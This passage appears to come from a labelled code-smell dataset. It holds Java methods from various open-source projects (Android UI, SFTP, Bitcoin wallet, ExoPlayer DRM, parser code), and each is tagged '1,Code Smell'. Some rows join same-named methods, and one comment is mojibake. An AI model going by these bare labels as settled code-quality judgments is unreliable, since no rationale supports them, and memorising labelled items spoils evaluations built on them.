      build.append(current);
    }
    index++;
  }
  if (build.length() > 0) {
    list.add(build.toString());
  }
  return list;
}",1,Code Smell
"/** 
 * Returns the API level corresponding to the given magic number, or  {@code -1} if the given arrayis not a well-formed dex file magic number.
 * @param magic array of bytes containing DEX file magic string
 * @return API level corresponding to magic string if valid, -1 otherwise.
 */
public static int magicToApi(byte[] magic){
  if (magic.length != 8) {
    return -1;
  }
  if ((magic[0] != 'd') || (magic[1] != 'e') || (magic[2] != 'x')|| (magic[3] != '\n')|| (magic[7] != '\0')) {
    return -1;
  }
  String version="""" + ((char)magic[4]) + ((char)magic[5])+ ((char)magic[6]);
  if (version.equals(VERSION_FOR_API_13)) {
    return API_NO_EXTENDED_OPCODES;
  }
 else   if (version.equals(VERSION_FOR_API_24)) {
    return API_DEFINE_INTERFACE_METHODS;
  }
 else   if (version.equals(VERSION_FOR_API_26)) {
    return API_METHOD_HANDLES;
  }
 else   if (version.equals(VERSION_FOR_API_28)) {
    return API_CONST_METHOD_HANDLE;
  }
 else   if (version.equals(VERSION_CURRENT)) {
    return API_CURRENT;
  }
  return -1;
}",1,Code Smell
"/** 
 * Most tiny ui has 8 cards in a row or 24 in grid.
 */
public void shouldContinueTheGroup(Context context,VideoGroup group,Runnable onNeedContinue,boolean isGrid){
  if (shouldContinueTheGroup(context,group,isGrid) && onNeedContinue != null) {
    onNeedContinue.run();
  }
}
/** 
 * Most tiny ui has 8 cards in a row or 24 in grid.
 */
public boolean shouldContinueTheGroup(Context context,VideoGroup group,boolean isGrid){
  if (group == null || group.getMediaGroup() == null) {
    return false;
  }
  MediaGroup mediaGroup=group.getMediaGroup();
  Pair<Integer,Long> sizeTimestamp=mContinuations.get(group.getId());
  long currentTimeMillis=System.currentTimeMillis();
  if (sizeTimestamp != null && currentTimeMillis - sizeTimestamp.second > 3_000) {
    sizeTimestamp=null;
  }
  int prevSize=sizeTimestamp != null ? sizeTimestamp.first : 0;
  int newSize=mediaGroup.getMediaItems() != null ? mediaGroup.getMediaItems().size() : 0;
  int totalSize=prevSize + newSize;
  MainUIData mainUIData=MainUIData.instance(context);
  boolean isScaledUIEnabled=mainUIData.getUIScale() < 0.8f || mainUIData.getVideoGridScale() < 0.8f;
  int minScaledSize=isGrid ? MIN_SCALED_GRID_GROUP_SIZE : MIN_SCALED_ROW_GROUP_SIZE;
  int minSize=isGrid ? MIN_GRID_GROUP_SIZE : MIN_ROW_GROUP_SIZE;
  boolean groupTooSmall=isScaledUIEnabled ? totalSize < minScaledSize : totalSize < minSize;
  mContinuations.put(group.getId(),new Pair<>(groupTooSmall ? totalSize : 0,currentTimeMillis));
  return groupTooSmall;
}",1,Code Smell
"private boolean isConflicted(ListTransaction listTransaction,Map<String,Boolean> conflictCache){
  if (listTransaction.confirmations() == 0 && !listTransaction.walletconflicts().isEmpty()) {
    Boolean active=conflictCache.computeIfAbsent(listTransaction.txid(),txid -> {
      try {
        getBitcoindService().getMempoolEntry(txid);
        return true;
      }
 catch (      JsonRpcException e) {
        return false;
      }
    }
);
    if (active) {
      for (      String conflictedTxid : listTransaction.walletconflicts()) {
        conflictCache.put(conflictedTxid,false);
      }
    }
    return !active;
  }
 else {
    return listTransaction.confirmations() < 0;
  }
}",1,Code Smell
"public static ByteBuffer getByteBuffer(PtNDArray ndArray,boolean tryDirect){
  if (!ndArray.getDevice().equals(Device.cpu())) {
    ndArray=ndArray.toDevice(Device.cpu(),false);
  }
  if (tryDirect) {
    if (ndArray.isSparse() || getLayout(ndArray) == 2 || !PyTorchLibrary.LIB.torchIsContiguous(ndArray.getHandle())) {
      ndArray=new PtNDArray(ndArray.getManager(),PyTorchLibrary.LIB.torchToContiguous(ndArray.getHandle()));
    }
    return PyTorchLibrary.LIB.torchDirectByteBuffer(ndArray.getHandle()).order(ByteOrder.nativeOrder());
  }
  return ByteBuffer.wrap(PyTorchLibrary.LIB.torchDataPtr(ndArray.getHandle())).order(ByteOrder.nativeOrder());
}",1,Code Smell
"@Override public void mouseClicked(MouseEvent e){
  if (e.getSource() == btnClose) {
    if (frame instanceof FrameMain && SysTray.isSysTrayInitiated() && Global.closeToSystray) {
      Logger.println(""最小化到系统托盘"");
      frame.setExtendedState(JFrame.ICONIFIED);
      frame.setVisible(false);
    }
 else {
      if (frame instanceof FrameMain && Global.downloadTab.activeTask > 0) {
        Object[] options={""我要退出"",""我再想想""};
        String msg=String.format(""当前仍有 %d 个任务在下载/转码，正在转码的文件退出后可能丢失或异常，确定要退出吗？"",Global.downloadTab.activeTask);
        int m=JOptionPane.showOptionDialog(null,msg,""警告"",JOptionPane.YES_NO_OPTION,JOptionPane.PLAIN_MESSAGE,null,options,options[0]);
        Logger.println(m);
        if (m != 0)         return;
      }
      Logger.println(""closing..."");
      WindowEvent event=new WindowEvent(frame,WindowEvent.WINDOW_CLOSING);
      frame.dispatchEvent(event);
    }
  }
 else   if (e.getSource() == btnMin) {
    frame.setExtendedState(JFrame.ICONIFIED);
    if (frame instanceof FrameMain && SysTray.isSysTrayInitiated() && Global.minimizeToSystray) {
      Logger.println(""最小化到系统托盘"");
      frame.setVisible(false);
    }
  }
}",1,Code Smell
"@Override public ErrorCode destroyChannel(String operator,String channelId,boolean isAdmin){
  HazelcastInstance hzInstance=m_Server.getHazelcastInstance();
  IMap<String,WFCMessage.ChannelInfo> mIMap=hzInstance.getMap(CHANNELS);
  WFCMessage.ChannelInfo oldInfo=mIMap.get(channelId);
  if (oldInfo == null) {
    return ErrorCode.ERROR_CODE_NOT_EXIST;
  }
  if ((oldInfo.getOwner() == null || !oldInfo.getOwner().equals(operator)) && !isAdmin) {
    return ErrorCode.ERROR_CODE_NOT_RIGHT;
  }
  WFCMessage.ChannelInfo.Builder newInfoBuilder=oldInfo.toBuilder();
  newInfoBuilder.setStatus(oldInfo.getStatus() | Channel_State_Mask_Deleted);
  newInfoBuilder.setUpdateDt(System.currentTimeMillis());
  mIMap.put(channelId,newInfoBuilder.build());
  databaseStore.clearChannelListener(channelId);
  hzInstance.getMultiMap(CHANNEL_LISTENERS).remove(channelId);
  callbackChannelInfoUpdateEvent(operator,channelId,Channel_Event_Destroy);
  return ErrorCode.ERROR_CODE_SUCCESS;
}
",1,Code Smell
"@Nullable public Config getInitConfig(){
  Config config=initConfig.get(INITNAME);
  if (config != null && config.getVersion() != null && config.getVersion() < Constant.PLUGIN_CONFIG_VERSION_3) {
    if (URLUtils.leetcodecnOld.equals(config.getUrl())) {
      config.setUrl(URLUtils.leetcodecn);
    }
    Iterator<String> iterator=config.getUserCookie().keySet().iterator();
    while (iterator.hasNext()) {
      String key=iterator.next();
      String value=config.getCookie(key);
      if (StringUtils.isBlank(value) || key.startsWith(URLUtils.leetcodecnOld)) {
        iterator.remove();
      }
    }
    config.setVersion(Constant.PLUGIN_CONFIG_VERSION_3);
    setInitConfig(config);
  }
  return config;
}",1,Code Smell
"@Override public void mouseClicked(final MouseEvent e){
  requestFocusInWindow();
  Runnable hyperlink=findHyperlink(e.getPoint());
  if (hyperlink != null && (myCursorType == Cursor.HAND_CURSOR)) {
    hyperlink.run();
  }
 else   if (e.getButton() == MouseEvent.BUTTON1 && isLocalMouseAction(e)) {
    int count=e.getClickCount();
    if (count == 1) {
    }
 else     if (count == 2) {
      final Point charCoords=panelToCharCoords(e.getPoint());
      Point start=SelectionUtil.getPreviousSeparator(charCoords,myTerminalTextBuffer);
      Point stop=SelectionUtil.getNextSeparator(charCoords,myTerminalTextBuffer);
      mySelection=new TerminalSelection(start);
      mySelection.updateEnd(stop);
      if (mySettingsProvider.copyOnSelect()) {
        handleCopyOnSelect();
      }
    }
 else     if (count == 3) {
      final Point charCoords=panelToCharCoords(e.getPoint());
      int startLine=charCoords.y;
      while (startLine > -getScrollBuffer().getLineCount() && myTerminalTextBuffer.getLine(startLine - 1).isWrapped()) {
        startLine--;
      }
      int endLine=charCoords.y;
      while (endLine < myTerminalTextBuffer.getHeight() && myTerminalTextBuffer.getLine(endLine).isWrapped()) {
        endLine++;
      }
      mySelection=new TerminalSelection(new Point(0,startLine));
      mySelection.updateEnd(new Point(myTermSize.width,endLine));
      if (mySettingsProvider.copyOnSelect()) {
        handleCopyOnSelect();
      }
    }
  }
 else   if (e.getButton() == MouseEvent.BUTTON2 && mySettingsProvider.pasteOnMiddleMouseClick() && isLocalMouseAction(e)) {
    handlePasteSelection();
  }
 else   if (e.getButton() == MouseEvent.BUTTON3) {
    if (mySettingsProvider.pasteOnMiddleMouseClick() && isLocalMouseAction(e)) {
      handlePasteSelection();
    }
 else {
      JPopupMenu popup=createPopupMenu();
      popup.show(e.getComponent(),e.getX(),e.getY());
    }
  }
  repaint();
}",1,Code Smell
"public void checkLock(){
  checkLock(-1);
}
@WorkerThread private void checkLock(int delayIndex){
  KeyguardManager keyguardManager=(KeyguardManager)mContext.getSystemService(Context.KEYGUARD_SERVICE);
  PowerManager powerManager=(PowerManager)mContext.getSystemService(Context.POWER_SERVICE);
  final boolean isProtected=keyguardManager.isKeyguardSecure();
  final boolean isLocked=keyguardManager.isKeyguardLocked();
  final boolean isInteractive=powerManager.isInteractive();
  delayIndex=getSafeCheckLockDelay(delayIndex);
  Log.i(TAG,""checkLock: isProtected=%b, isLocked=%b, isInteractive=%b, delay=%d"",isProtected,isLocked,isInteractive,sCheckLockDelays[delayIndex]);
  if (mCheckLockTask != null) {
    Log.i(TAG,""checkLock: cancelling CheckLockTask[%x]"",System.identityHashCode(mCheckLockTask));
    mCheckLockTask.cancel();
  }
  if (isProtected && !isLocked && !isInteractive) {
    mCheckLockTask=new CheckLockTask(delayIndex);
    Log.i(TAG,""checkLock: scheduling CheckLockTask[%x] for %d ms"",System.identityHashCode(mCheckLockTask),sCheckLockDelays[delayIndex]);
    mTimer.schedule(mCheckLockTask,sCheckLockDelays[delayIndex]);
  }
 else {
    Log.d(TAG,""checkLock: no need to schedule CheckLockTask"");
    if (isProtected && isLocked) {
      if (mRunnable != null) {
        mRunnable.run();
      }
    }
  }
}",1,Code Smell
"private FileInfo resolveSymlink(String name,String pathToResolve,FileAttributes attrs,String longName) throws Exception {
  try {
    System.out.println(""Following symlink: "" + pathToResolve);
    while (true) {
      String str=sftp.readlink(pathToResolve);
      System.out.println(""Read symlink: "" + pathToResolve + ""=""+ str);
      pathToResolve=str.startsWith(""/"") ? str : PathUtils.combineUnix(pathToResolve,str);
      System.out.println(""Getting link attrs: "" + pathToResolve);
      attrs=sftp.stat(pathToResolve);
      if (attrs.getType() != Type.SYMLINK) {
        FileInfo e=new FileInfo(name,pathToResolve,(attrs.getType() == Type.DIRECTORY ? -1 : attrs.getSize()),attrs.getType() == Type.DIRECTORY ? FileType.DirLink : FileType.FileLink,attrs.getMtime() * 1000,FilePermission.toMask(attrs.getPermissions()),PROTO_SFTP,getPermissionStr(attrs.getPermissions()),attrs.getAtime(),longName,name.startsWith("".""));
        return e;
      }
    }
  }
 catch (  SFTPException e) {
    if (e.getStatusCode() == Response.StatusCode.NO_SUCH_FILE || e.getStatusCode() == Response.StatusCode.NO_SUCH_PATH || e.getStatusCode() == Response.StatusCode.PERMISSION_DENIED) {
      return new FileInfo(name,pathToResolve,0,FileType.FileLink,attrs.getMtime() * 1000,FilePermission.toMask(attrs.getPermissions()),PROTO_SFTP,getPermissionStr(attrs.getPermissions()),attrs.getAtime(),longName,name.startsWith("".""));
    }
    throw e;
  }
catch (  Exception e) {
    e.printStackTrace();
    throw e;
  }
}",1,Code Smell
"@Override public void onSkipToPrevious(Player player,ControlDispatcher controlDispatcher){
  Timeline timeline=player.getCurrentTimeline();
  if (timeline.isEmpty() || player.isPlayingAd()) {
    return;
  }
  int windowIndex=player.getCurrentWindowIndex();
  timeline.getWindow(windowIndex,window);
  int previousWindowIndex=player.getPreviousWindowIndex();
  if (previousWindowIndex != C.INDEX_UNSET && (player.getCurrentPosition() <= MAX_POSITION_FOR_SEEK_TO_PREVIOUS || (window.isDynamic && !window.isSeekable))) {
    controlDispatcher.dispatchSeekTo(player,previousWindowIndex,C.TIME_UNSET);
  }
 else {
    controlDispatcher.dispatchSeekTo(player,windowIndex,0);
  }
}",1,Code Smell
"private void setIndexToPaintingOverlay(int index,PaintingOverlay paintingOverlay){
  if (paintingOverlay == null) {
    return;
  }
  paintingOverlay.reset();
  paintingOverlay.setVisibility(View.GONE);
  if (!imagesArrLocals.isEmpty() && index >= 0 && index < imagesArrLocals.size()) {
    Object object=imagesArrLocals.get(index);
    boolean isVideo=false;
    String paintPath=null;
    ArrayList<VideoEditedInfo.MediaEntity> mediaEntities=null;
    if (object instanceof MediaController.PhotoEntry) {
      MediaController.PhotoEntry photoEntry=(MediaController.PhotoEntry)object;
      isVideo=photoEntry.isVideo;
      paintPath=photoEntry.paintPath;
      mediaEntities=photoEntry.mediaEntities;
    }
 else     if (object instanceof MediaController.SearchImage) {
      MediaController.SearchImage photoEntry=(MediaController.SearchImage)object;
      paintPath=photoEntry.paintPath;
      mediaEntities=photoEntry.mediaEntities;
    }
    paintingOverlay.setVisibility(View.VISIBLE);
    paintingOverlay.setData(paintPath,mediaEntities,isVideo,false);
  }
}",1,Code Smell
"@Override public List<DeptVO> queryTreeList(QueryDeptListBO queryDeptListBO){
  Integer dataAuthType=adminService.queryDataType(UserUtil.getUserId(),MenuIdConstant.DEPT_MENU_ID).getData();
  List<DeptVO> deptVOList=new ArrayList<>();
  if (EmployeeHolder.isHrmAdmin() || dataAuthType.equals(DataAuthEnum.ALL.getValue())) {
    if (""tree"".equals(queryDeptListBO.getType()) || queryDeptListBO.getType() == null) {
      List<DeptVO> deptList=deptMapper.queryList(queryDeptListBO);
      if (StrUtil.isNotEmpty(queryDeptListBO.getName())) {
        List<HrmDept> list=lambdaQuery().select(HrmDept::getDeptId).like(HrmDept::getName,queryDeptListBO.getName()).list();
        for (        HrmDept dept : list) {
          deptVOList.addAll(createTree1(dept.getDeptId(),deptList));
        }
      }
 else {
        deptVOList=createTree(0,deptList);
      }
    }
    if (""update"".equals(queryDeptListBO.getType())) {
      List<HrmDept> deptList=list();
      deptVOList=deptList.stream().map(dept -> {
        DeptVO deptVO=new DeptVO();
        deptVO.setDeptId(dept.getDeptId());
        deptVO.setName(dept.getName());
        deptVO.setPid(dept.getPid());
        return deptVO;
      }
).collect(Collectors.toList());
      List<Integer> ids=RecursionUtil.getChildList(deptVOList,""pid"",queryDeptListBO.getId(),""deptId"",""deptId"");
      ids.add(queryDeptListBO.getId());
      deptVOList.removeIf(dept -> ids.contains(dept.getDeptId()));
    }
  }
 else {
    deptVOList=getDataAuthDeptList(queryDeptListBO,dataAuthType);
  }
  return deptVOList;
}",1,Code Smell
"/** 
 * 淇濆瓨閰嶇疆鏂囦欢锛屽苟缂撳瓨md5.
 */
static public boolean dump(String dataId,String group,String tenant,String content,long lastModifiedTs){
  String groupKey=GroupKey2.getKey(dataId,group,tenant);
  makeSure(groupKey);
  final int lockResult=tryWriteLock(groupKey);
  assert (lockResult != 0);
  if (lockResult < 0) {
    dumpLog.warn(""[dump-error] write lock failed. {}"",groupKey);
    return false;
  }
  try {
    final String md5=MD5.getInstance().getMD5String(content);
    if (md5.equals(ConfigService.getContentMd5(groupKey))) {
      dumpLog.warn(""[dump-ignore] ignore to save cache file. groupKey={}, md5={}, lastModifiedOld={}, "" + ""lastModifiedNew={}"",groupKey,md5,ConfigService.getLastModifiedTs(groupKey),lastModifiedTs);
    }
 else     if (!STANDALONE_MODE || PropertyUtil.isStandaloneUseMysql()) {
      DiskUtil.saveToDisk(dataId,group,tenant,content);
    }
    updateMd5(groupKey,md5,lastModifiedTs);
    return true;
  }
 catch (  IOException ioe) {
    dumpLog.error(""[dump-exception] save disk error. "" + groupKey + "", ""+ ioe.toString(),ioe);
    if (ioe.getMessage() != null) {
      String errMsg=ioe.getMessage();
      if (NO_SPACE_CN.equals(errMsg) || NO_SPACE_EN.equals(errMsg) || errMsg.contains(DISK_QUATA_CN)|| errMsg.contains(DISK_QUATA_EN)) {
        fatalLog.error(""纾佺洏婊¤嚜鏉�閫�鍑�"",ioe);
        System.exit(0);
      }
    }
    return false;
  }
 finally {
    releaseWriteLock(groupKey);
  }
}",1,Code Smell
"private void setElectrumServerInConfig(Config config){
  Server existingServer=config.getRecentElectrumServers().stream().filter(server -> electrumHost.getText().equals(server.getAlias())).findFirst().orElse(null);
  if (existingServer != null) {
    config.setElectrumServer(existingServer);
    return;
  }
  String hostAsString=getHost(electrumHost.getText());
  Integer portAsInteger=getPort(electrumPort.getText());
  if (hostAsString != null && !hostAsString.isEmpty() && portAsInteger != null && isValidPort(portAsInteger)) {
    config.setElectrumServer(new Server(getProtocol().toUrlString(hostAsString,portAsInteger)));
  }
 else   if (hostAsString != null && !hostAsString.isEmpty()) {
    config.setElectrumServer(new Server(getProtocol().toUrlString(hostAsString)));
  }
 else {
    config.setElectrumServer(null);
  }
}
",1,Code Smell
"public Expr_cursor_attributeContext expr_cursor_attribute(){
  return getRuleContext(Expr_cursor_attributeContext.class,0);
}
public final Expr_cursor_attributeContext expr_cursor_attribute() throws RecognitionException {
  Expr_cursor_attributeContext _localctx=new Expr_cursor_attributeContext(_ctx,getState());
  enterRule(_localctx,402,RULE_expr_cursor_attribute);
  int _la;
  try {
    enterOuterAlt(_localctx,1);
{
      setState(2853);
      ident();
      setState(2854);
      match(T__2);
      setState(2855);
      _la=_input.LA(1);
      if (!(_la == T_FOUND || _la == T_ISOPEN || _la == T_NOTFOUND)) {
        _errHandler.recoverInline(this);
      }
 else {
        if (_input.LA(1) == Token.EOF)         matchedEOF=true;
        _errHandler.reportMatch(this);
        consume();
      }
    }
  }
 catch (  RecognitionException re) {
    _localctx.exception=re;
    _errHandler.reportError(this,re);
    _errHandler.recover(this,re);
  }
 finally {
    exitRule();
  }
  return _localctx;
}",1,Code Smell
"/** 
 * Sets which side the SlidingMenu should appear on.
 * @param mode must be either SlidingMenu.LEFT or SlidingMenu.RIGHT
 */
public void setMode(int mode){
  if (mode != LEFT && mode != RIGHT && mode != LEFT_RIGHT) {
    throw new IllegalStateException(""SlidingMenu mode must be LEFT, RIGHT, or LEFT_RIGHT"");
  }
  mViewBehind.setMode(mode);
}
",1,Code Smell
"@Override public View createView(Context context){
  View rootView=super.createView(context);
  resetHeader(false);
  DefaultItemAnimator defaultItemAnimator=new DefaultItemAnimator();
  defaultItemAnimator.setSupportsChangeAnimations(false);
  defaultItemAnimator.setDelayAnimations(false);
  listView.setItemAnimator(defaultItemAnimator);
  listView.setOnItemClickListener((view,position) -> {
    if (view instanceof GiftedUserCell) {
      GiftedUserCell cell=(GiftedUserCell)view;
      TL_stories.TL_boost boost=cell.getBoost();
      if (((boost.gift || boost.giveaway) && boost.user_id >= 0) || boost.unclaimed) {
        TLRPC.TL_payments_checkedGiftCode giftCode=new TLRPC.TL_payments_checkedGiftCode();
        giftCode.giveaway_msg_id=boost.giveaway_msg_id;
        giftCode.to_id=boost.user_id;
        giftCode.from_id=MessagesController.getInstance(UserConfig.selectedAccount).getPeer(-currentChat.id);
        giftCode.date=boost.date;
        giftCode.via_giveaway=boost.giveaway;
        giftCode.months=(boost.expires - boost.date) / 30 / 86400;
        if (boost.unclaimed) {
          giftCode.to_id=NO_USER_ID;
          giftCode.flags=-1;
        }
 else {
          giftCode.boost=boost;
        }
        new GiftInfoBottomSheet(this,false,true,giftCode,boost.used_gift_slug).show();
      }
 else       if (boost.giveaway && boost.user_id == NO_USER_ID) {
        final Bulletin.LottieLayout layout=new Bulletin.LottieLayout(getParentActivity(),getResourceProvider());
        layout.setAnimation(R.raw.chats_infotip,36,36);
        layout.textView.setText(LocaleController.getString(""BoostingRecipientWillBeSelected"",R.string.BoostingRecipientWillBeSelected));
        layout.textView.setSingleLine(false);
        layout.textView.setMaxLines(2);
        Bulletin.make(this,layout,Bulletin.DURATION_LONG).show();
      }
 else       if (!boost.gift && !boost.giveaway) {
        presentFragment(ProfileActivity.of(cell.getDialogId()));
      }
    }
    if (view instanceof TextCell) {
      BoostPagerBottomSheet.show(this,dialogId,resourceProvider);
    }
    if (view instanceof GiveawayCell) {
      BoostPagerBottomSheet.show(this,resourceProvider,dialogId,((GiveawayCell)view).getPrepaidGiveaway());
    }
    if (items.get(position).viewType == SHOW_MORE_VIEW_TYPE) {
      loadUsers(selectedTab == TAB_GIFTS);
    }
  }
);
  createEmptyView(getContext());
  loadStatistic();
  updateRows(false);
  return rootView;
}",1,Code Smell
"private Map<Object,Object> removeThemeSpecificDefaults(UIDefaults defaults){
  ArrayList<String> themeSpecificKeys=new ArrayList<>();
  for (  Object key : defaults.keySet()) {
    if (key instanceof String && ((String)key).startsWith(""["") && !((String)key).startsWith(""[style]""))     themeSpecificKeys.add((String)key);
  }
  Map<Object,Object> themeSpecificDefaults=new HashMap<>();
  String currentThemePrefix='[' + name.replace(' ','_') + ']';
  String currentThemeAndAuthorPrefix='[' + name.replace(' ','_') + ""---""+ author.replace(' ','_')+ ']';
  String currentAuthorPrefix=""[author-"" + author.replace(' ','_') + ']';
  String allThemesPrefix=""[*]"";
  String[] prefixes={currentThemePrefix,currentThemeAndAuthorPrefix,currentAuthorPrefix,allThemesPrefix};
  for (  String key : themeSpecificKeys) {
    Object value=defaults.remove(key);
    for (    String prefix : prefixes) {
      if (key.startsWith(prefix)) {
        themeSpecificDefaults.put(key.substring(prefix.length()),value);
        break;
      }
    }
  }
  return themeSpecificDefaults;
}
",1,Code Smell
"public void setDrawRipple(boolean value){
  if (Build.VERSION.SDK_INT < 21 || value == drawRipple) {
    return;
  }
  drawRipple=value;
  if (rippleDrawable == null) {
    ripplePaint=new Paint(Paint.ANTI_ALIAS_FLAG);
    ripplePaint.setColor(0xffffffff);
    Drawable maskDrawable;
    if (Build.VERSION.SDK_INT >= 23) {
      maskDrawable=null;
    }
 else {
      maskDrawable=new Drawable(){
        @Override public void draw(        Canvas canvas){
          android.graphics.Rect bounds=getBounds();
          canvas.drawCircle(bounds.centerX(),bounds.centerY(),AndroidUtilities.dp(18),ripplePaint);
        }
        @Override public void setAlpha(        int alpha){
        }
        @Override public void setColorFilter(        ColorFilter colorFilter){
        }
        @Override public int getOpacity(){
          return PixelFormat.UNKNOWN;
        }
      }
;
    }
    ColorStateList colorStateList=new ColorStateList(new int[][]{StateSet.WILD_CARD},new int[]{0});
    rippleDrawable=new RippleDrawable(colorStateList,null,maskDrawable);
    if (Build.VERSION.SDK_INT >= 23) {
      rippleDrawable.setRadius(AndroidUtilities.dp(18));
    }
    rippleDrawable.setCallback(this);
  }
  if (isChecked && colorSet != 2 || !isChecked && colorSet != 1) {
    int color=Theme.getColor(isChecked ? Theme.key_switchTrackBlueSelectorChecked : Theme.key_switchTrackBlueSelector,resourcesProvider);
    color=processColor(color);
    ColorStateList colorStateList=new ColorStateList(new int[][]{StateSet.WILD_CARD},new int[]{color});
    rippleDrawable.setColor(colorStateList);
    colorSet=isChecked ? 2 : 1;
  }
  if (Build.VERSION.SDK_INT >= 28 && value) {
    rippleDrawable.setHotspot(isChecked ? 0 : AndroidUtilities.dp(100),AndroidUtilities.dp(18));
  }
  rippleDrawable.setState(value ? pressedState : StateSet.NOTHING);
  invalidate();
}",1,Code Smell
"@Override public void visitAnyInstruction(Clazz clazz,Method method,CodeAttribute codeAttribute,int offset,Instruction instruction){
  if (instruction.actualOpcode() == Instruction.OP_INVOKEINTERFACE && typeAdapterListLocal == -1) {
    ConstantInstruction constantInstruction=(ConstantInstruction)instruction;
    Constant constant=((ProgramClass)clazz).constantPool[constantInstruction.constantIndex];
    if (constant instanceof InterfaceMethodrefConstant) {
      InterfaceMethodrefConstant interfaceMethodrefConstant=(InterfaceMethodrefConstant)constant;
      if (interfaceMethodrefConstant.getClassName(clazz).equals(ClassConstants.NAME_JAVA_UTIL_LIST) && interfaceMethodrefConstant.getName(clazz).equals(ClassConstants.METHOD_NAME_ADD_ALL) && interfaceMethodrefConstant.getType(clazz).equals(ClassConstants.METHOD_TYPE_ADD_ALL)) {
        lazyPartialEvaluator.visitCodeAttribute(clazz,method,codeAttribute);
        TracedStack stackBefore=partialEvaluator.getStackBefore(offset);
        InstructionOffsetValue instructionOffsetValue=stackBefore.getTopProducerValue(0).instructionOffsetValue();
        for (int instructionIndex=0; instructionIndex < instructionOffsetValue.instructionOffsetCount(); instructionIndex++) {
          int instructionOffset=instructionOffsetValue.instructionOffset(instructionIndex);
          codeAttribute.instructionAccept(clazz,method,instructionOffset,new LocalFinder());
        }
      }
    }
  }
 else   if (instruction.actualOpcode() == Instruction.OP_INVOKESPECIAL && insertionOffset == -1) {
    ConstantInstruction constantInstruction=(ConstantInstruction)instruction;
    Constant constant=((ProgramClass)clazz).constantPool[constantInstruction.constantIndex];
    if (constant instanceof MethodrefConstant) {
      MethodrefConstant methodrefConstant=(MethodrefConstant)constant;
      if (methodrefConstant.getClassName(clazz).equals(ClassConstants.NAME_JAVA_LANG_OBJECT) && methodrefConstant.getName(clazz).equals(ClassConstants.METHOD_NAME_INIT) && methodrefConstant.getType(clazz).equals(ClassConstants.METHOD_TYPE_INIT)) {
        insertionOffset=offset;
      }
    }
  }
}
@Override public void visitAnyInstruction(Clazz clazz,Method method,CodeAttribute codeAttribute,int offset,Instruction instruction){
  if (instruction.canonicalOpcode() == Instruction.OP_ALOAD) {
    VariableInstruction variableInstruction=(VariableInstruction)instruction;
    typeAdapterListLocal=variableInstruction.variableIndex;
  }
}",1,Code Smell
"@Override public DrmSession<T> acquireSession(Looper playbackLooper,DrmInitData drmInitData){
  Assertions.checkState(this.playbackLooper == null || this.playbackLooper == playbackLooper);
  if (sessions.isEmpty()) {
    this.playbackLooper=playbackLooper;
    if (mediaDrmHandler == null) {
      mediaDrmHandler=new MediaDrmHandler(playbackLooper);
    }
  }
  List<SchemeData> schemeDatas=null;
  if (offlineLicenseKeySetId == null) {
    schemeDatas=getSchemeDatas(drmInitData,uuid,false);
    if (schemeDatas.isEmpty()) {
      final MissingSchemeDataException error=new MissingSchemeDataException(uuid);
      eventDispatcher.dispatch(listener -> listener.onDrmSessionManagerError(error));
      return new ErrorStateDrmSession<>(new DrmSessionException(error));
    }
  }
  DefaultDrmSession<T> session;
  if (!multiSession) {
    session=sessions.isEmpty() ? null : sessions.get(0);
  }
 else {
    session=null;
    for (    DefaultDrmSession<T> existingSession : sessions) {
      if (Util.areEqual(existingSession.schemeDatas,schemeDatas)) {
        session=existingSession;
        break;
      }
    }
  }
  if (session == null) {
    session=new DefaultDrmSession<>(uuid,mediaDrm,this,schemeDatas,mode,offlineLicenseKeySetId,optionalKeyRequestParameters,callback,playbackLooper,eventDispatcher,initialDrmRequestRetryCount);
    sessions.add(session);
  }
  session.acquire();
  return session;
}",1,Code Smell
"public void openFiles(List<File> files){
  boolean verifyOpened=false;
  for (  File file : files) {
    if (isWalletFile(file)) {
      openWalletFile(file,true);
    }
 else     if (isVerifyDownloadFile(file)) {
      if (!verifyOpened) {
        verifyDownload(new ActionEvent(file,rootStack));
        verifyOpened=true;
      }
    }
 else {
      openTransactionFile(file);
    }
  }
}
",1,Code Smell
"public List<InLongTopic> getConsumerSubset(List<InLongTopic> totalTopics){
  if (this.consumerSubsetSize <= 1 || this.containerId == null || this.consumerSubsetType == ConsumerSubsetType.ALL) {
    return totalTopics;
  }
  List<InLongTopic> subset=new ArrayList<>(totalTopics.size());
  int containerHashId=Math.abs(this.containerId.hashCode()) % this.consumerSubsetSize;
  for (  InLongTopic topic : totalTopics) {
    int topicHashId=0;
    if (this.consumerSubsetType == ConsumerSubsetType.CLUSTER) {
      String hashString=topic.getInLongCluster().getClusterId();
      topicHashId=Math.abs(hashString.hashCode()) % this.consumerSubsetSize;
    }
 else {
      String hashString=topic.getTopicKey();
      topicHashId=Math.abs(hashString.hashCode()) % this.consumerSubsetSize;
    }
    if (containerHashId == topicHashId) {
      subset.add(topic);
    }
  }
  return subset;
}",1,Code Smell
"public Collection<double[]> getIntersection(TrackNode node1,TrackNode node2,TrackEdge other,TrackNode other1,TrackNode other2){
  Vec3 v1=node1.location.getLocation();
  Vec3 v2=node2.location.getLocation();
  Vec3 w1=other1.location.getLocation();
  Vec3 w2=other2.location.getLocation();
  if (isInterDimensional() || other.isInterDimensional())   return Collections.emptyList();
  if (v1.y != v2.y || v1.y != w1.y || v1.y != w2.y)   return Collections.emptyList();
  if (!isTurn()) {
    if (!other.isTurn())     return ImmutableList.of(VecHelper.intersectRanged(v1,w1,v2,w2,Axis.Y));
    return other.getIntersection(other1,other2,this,node1,node2).stream().map(a -> new double[]{a[1],a[0]}).toList();
  }
  AABB bb=turn.getBounds();
  if (!other.isTurn()) {
    if (!bb.intersects(w1,w2))     return Collections.emptyList();
    Vec3 seg1=v1;
    Vec3 seg2=null;
    double t=0;
    Collection<double[]> intersections=new ArrayList<>();
    for (int i=0; i < turn.getSegmentCount(); i++) {
      double tOffset=t;
      t+=.5;
      seg2=getPosition(null,t / getLength());
      double[] intersection=VecHelper.intersectRanged(seg1,w1,seg2,w2,Axis.Y);
      seg1=seg2;
      if (intersection == null)       continue;
      intersection[0]+=tOffset;
      intersections.add(intersection);
    }
    return intersections;
  }
  if (!bb.intersects(other.turn.getBounds()))   return Collections.emptyList();
  Vec3 seg1=v1;
  Vec3 seg2=null;
  double t=0;
  Collection<double[]> intersections=new ArrayList<>();
  for (int i=0; i < turn.getSegmentCount(); i++) {
    double tOffset=t;
    t+=.5;
    seg2=getPosition(null,t / getLength());
    Vec3 otherSeg1=w1;
    Vec3 otherSeg2=null;
    double u=0;
    for (int j=0; j < other.turn.getSegmentCount(); j++) {
      double uOffset=u;
      u+=.5;
      otherSeg2=other.getPosition(null,u / other.getLength());
      double[] intersection=VecHelper.intersectRanged(seg1,otherSeg1,seg2,otherSeg2,Axis.Y);
